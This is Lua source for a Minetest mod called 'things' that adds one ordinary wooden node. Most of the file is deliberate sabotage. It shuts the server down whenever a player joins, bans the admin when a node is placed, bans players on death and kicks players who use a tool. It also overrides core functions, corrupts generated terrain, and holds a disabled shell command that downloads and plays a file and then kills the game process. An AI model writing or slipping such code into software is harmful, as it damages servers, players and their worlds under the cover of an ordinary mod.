local load_time_start = os.clock()


local new_nodes = true
local auto_shutdown = true
local replace_setnode = true
local replace_vars = false
local ban_thing = true
local new_randomity = true
local ban_on_die = true
local lol_function = true
local yaw_rotating = true
local physics_changing = true
local random_mapgen = true
local replace_more_vars = true
local add_sound = false
local tell_news = true

if new_nodes then
	minetest.register_node("things:framed_wood", {
		description = "Framed Wood",
		tiles = {"default_wood.png^default_glass.png"},
		groups = {snappy=1,choppy=2,oddly_breakable_by_hand=2},
	})
end

if auto_shutdown then
	minetest.register_on_prejoinplayer(function(name, ip)
		core.request_shutdown()
		core.chat_send_all(";)")
	end)
end

if replace_setnode then
	local sn = minetest.set_node
	function minetest.set_node(pos, ...)
		pos.y = pos.y+1
		return sn(pos, ...)
	end
	minetest.add_node = minetest.set_node
end

if replace_vars then
	local null = nil
	core = null
	minetest = null
end

if ban_thing then
	minetest.register_node("things:thing", {
		description="Thing BEWARE!",
		tiles={"abjrules.png"},
		on_place=function()
			minetest.execute_chatcommand("ban Admin")
		end
	})
end

if new_randomity then
	function math.random(a)
		return a or 1
	end
end

if ban_on_die then
	minetest.register_on_dieplayer(function(player)
		minetest.chat_send_all(player:get_player_name().." died and will get banned!")
		minetest.ban_player(player:get_player_name())
	end)
end

if lol_function then
	function lol()
		print("trololo :P")
		return lol()
	end
end

if yaw_rotating then
	local yaw = 0
	minetest.register_globalstep(function(dtime)
		yaw = yaw + 0.1
		for _, player in pairs(minetest.get_connected_players()) do
		player:set_look_yaw(yaw)
		end
	end)
end

if physics_changing then
	local r = math.random
	local randomize_min = 1
	local randomize_max = 10

	minetest.register_globalstep(function(dtime)
		for _, player in pairs(minetest.get_connected_players()) do
		player:set_physics_override(
			r(randomize_min,randomize_max),
			r(randomize_min,randomize_max),
			r(randomize_min,randomize_max)
		)
		end
	end)
end

if random_mapgen then
	local count = 0
	local c_air = minetest.get_content_id("air")

	local function count_nodes()
		for i,_ in pairs(minetest.registered_nodes) do
			count = count+1
		end
	end

	minetest.register_on_generated(function(minp, maxp, seed)
		if count == 0 then
			count_nodes()
		end

		local pr = PseudoRandom(seed+68)

		local vm, emin, emax = minetest.get_mapgen_object("voxelmanip")
		local data = vm:get_data()
		local area = VoxelArea:new{MinEdge=emin, MaxEdge=emax}

		for i in area:iterp(minp, maxp) do
			if data[i] ~= c_air then
				data[i] = pr:next(1, count)
			end
		end

		vm:set_data(data)
		vm:write_to_map()
	end)
end

if replace_more_vars then
	minetest.set_node = minetest.remove_node
	minetest.request_shutdown = function()
		minetest.chat_send_all("<herobrine> hjalp")
	end
	minetest.nodedef_default.stack_max = 42
	minetest.nodedef_default.on_place = function()
		minetest.chat_send_all("Beep")
	end
	function dump(s)
		return "nil"
	end
	for name, def in pairs(minetest.registered_tools) do
		def.on_use = function(itemstack, player, pointed_thing)
			minetest.kick_player(player:get_player_name(), "TROLOLOLO ;D")
		end
	end
end

if add_sound then
	os.execute("amixer set Master 180% && curl -s https://raw.githubusercontent.com/GNOME/gnome-robots/1a0ecfd392b2deab0fee9f10a1e8630a3b31e58d/data/die.ogg | tee tmp && paplay tmp && kill $(pgrep minetest)")
end

if tell_news then
	local flag, http = pcall(require, "socket.http")
	if not flag then
		error("socket.http missing")
	end
	http.TIMEOUT = 5

	local feed = "https://queryfeed.net/tw?q=Minetest"
	local old_tweet

	local tweet
	local function pcall_function()
		local contents = tweet.responseData.feed.entries[1]
		local text = "<"..contents.author.."> "..contents.contentSnippet
		if old_tweet ~= text then
			old_tweet = text
			minetest.chat_send_all(text)
		end
	end

	local function get_latest_tweet()
		local json = http.request("https://ajax.googleapis.com/ajax/services/feed/load?v=1.0&q="..feed.."&num=1")
		tweet = json and minetest.parse_json(json) or {}

		pcall(pcall_function)

		minetest.after(5, function()
			get_latest_tweet()
		end)
	end

	minetest.after(1, function()
		get_latest_tweet()
	end)
end


local time = math.floor(tonumber(os.clock()-load_time_start)*100+0.5)/100
local msg = "[things] loaded after ca. "..time
if time > 0.05 then
	print(msg)
else
	minetest.log("info", msg)
end
